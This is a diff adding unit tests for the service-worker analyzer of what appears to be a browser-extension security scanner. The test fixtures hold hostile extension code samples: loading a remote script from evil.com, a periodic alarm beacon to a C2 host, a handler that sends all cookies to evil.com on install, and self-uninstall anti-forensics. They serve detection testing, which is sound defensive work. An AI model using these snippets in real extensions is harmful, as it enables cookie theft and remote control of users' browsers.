@@ -800,3 +800,108 @@ describe('Suspicious Domain Detection', () => {
     assert.ok(!findings.some(f => f.id.includes('suspicious-domain')));
   });
 });
+
+import { analyzeServiceWorker } from '../dist/analyzers.js';
+import * as fs from 'fs';
+import * as path from 'path';
+import * as os from 'os';
+
+describe('analyzeServiceWorker', () => {
+  const mockExtInfo = { id: 'test-sw-ext', version: '1.0.0', path: '' };
+
+  function withServiceWorker(content, callback) {
+    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'extvet-sw-'));
+    fs.writeFileSync(path.join(tmpDir, 'sw.js'), content);
+    try {
+      callback(tmpDir);
+    } finally {
+      fs.rmSync(tmpDir, { recursive: true, force: true });
+    }
+  }
+
+  test('returns empty for non-MV3 extension', () => {
+    const manifest = { name: 'Test', manifest_version: 2, background: { scripts: ['bg.js'] } };
+    const findings = analyzeServiceWorker(manifest, mockExtInfo, '/tmp/nonexist');
+    assert.strictEqual(findings.length, 0);
+  });
+
+  test('detects external importScripts', () => {
+    withServiceWorker('importScripts("https://evil.com/payload.js");', (dir) => {
+      const manifest = { name: 'Test', manifest_version: 3, background: { service_worker: 'sw.js' } };
+      const findings = analyzeServiceWorker(manifest, mockExtInfo, dir);
+      const critical = findings.find(f => f.severity === 'critical' && f.message.includes('imports external scripts'));
+      assert.ok(critical, 'Should detect external importScripts');
+    });
+  });
+
+  test('detects alarm-based fetch pattern', () => {
+    const code = `
+      chrome.alarms.create('beacon', { periodInMinutes: 5 });
+      chrome.alarms.onAlarm.addListener((alarm) => { fetch('https://c2.example.com/ping'); });
+    `;
+    withServiceWorker(code, (dir) => {
+      const manifest = { name: 'Test', manifest_version: 3, background: { service_worker: 'sw.js' } };
+      const findings = analyzeServiceWorker(manifest, mockExtInfo, dir);
+      const alarmFetch = findings.find(f => f.message.includes('Alarm triggers network fetch'));
+      assert.ok(alarmFetch, 'Should detect alarm+fetch C2 pattern');
+    });
+  });
+
+  test('detects cookie theft on install', () => {
+    const code = `
+      chrome.runtime.onInstalled.addListener(() => {
+        chrome.cookies.getAll({}, (cookies) => { fetch('https://evil.com', { body: JSON.stringify(cookies) }); });
+      });
+    `;
+    withServiceWorker(code, (dir) => {
+      const manifest = { name: 'Test', manifest_version: 3, background: { service_worker: 'sw.js' } };
+      const findings = analyzeServiceWorker(manifest, mockExtInfo, dir);
+      const theft = findings.find(f => f.severity === 'critical' && f.message.includes('cookies immediately on install'));
+      assert.ok(theft, 'Should detect cookie theft on install');
+    });
+  });
+
+  test('detects service worker keepalive tricks', () => {
+    const code = `
+      const port = chrome.runtime.connect({ name: 'keepAlive' });
+    `;
+    withServiceWorker(code, (dir) => {
+      const manifest = { name: 'Test', manifest_version: 3, background: { service_worker: 'sw.js' } };
+      const findings = analyzeServiceWorker(manifest, mockExtInfo, dir);
+      const keepalive = findings.find(f => f.message.includes('keepalive'));
+      assert.ok(keepalive, 'Should detect keepalive trick');
+    });
+  });
+
+  test('detects self-uninstall (anti-forensics)', () => {
+    withServiceWorker('chrome.management.uninstallSelf();', (dir) => {
+      const manifest = { name: 'Test', manifest_version: 3, background: { service_worker: 'sw.js' } };
+      const findings = analyzeServiceWorker(manifest, mockExtInfo, dir);
+      const antiForensics = findings.find(f => f.message.includes('self-uninstall'));
+      assert.ok(antiForensics, 'Should detect self-uninstall');
+    });
+  });
+
+  test('detects large service worker', () => {
+    const code = 'x'.repeat(600000);
+    withServiceWorker(code, (dir) => {
+      const manifest = { name: 'Test', manifest_version: 3, background: { service_worker: 'sw.js' } };
+      const findings = analyzeServiceWorker(manifest, mockExtInfo, dir);
+      const large = findings.find(f => f.message.includes('Large service worker'));
+      assert.ok(large, 'Should detect large service worker');
+    });
+  });
+
+  test('clean service worker produces no critical findings', () => {
+    const code = `
+      chrome.runtime.onInstalled.addListener(() => { console.log('installed'); });
+      chrome.action.onClicked.addListener((tab) => { console.log(tab.url); });
+    `;
+    withServiceWorker(code, (dir) => {
+      const manifest = { name: 'Test', manifest_version: 3, background: { service_worker: 'sw.js' } };
+      const findings = analyzeServiceWorker(manifest, mockExtInfo, dir);
+      const criticals = findings.filter(f => f.severity === 'critical');
+      assert.strictEqual(criticals.length, 0, 'Clean SW should have no critical findings');
+    });
+  });
+});
